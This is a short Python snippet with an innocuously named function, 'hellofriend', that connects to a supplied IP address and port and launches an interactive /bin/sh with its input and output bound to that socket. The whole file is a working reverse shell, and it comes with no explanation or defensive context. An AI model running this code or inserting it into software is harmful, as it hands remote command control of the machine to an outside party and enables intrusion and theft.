import socket, subprocess

def hellofriend(ip: str, port: int):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, port))
    subprocess.call( ["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno() )

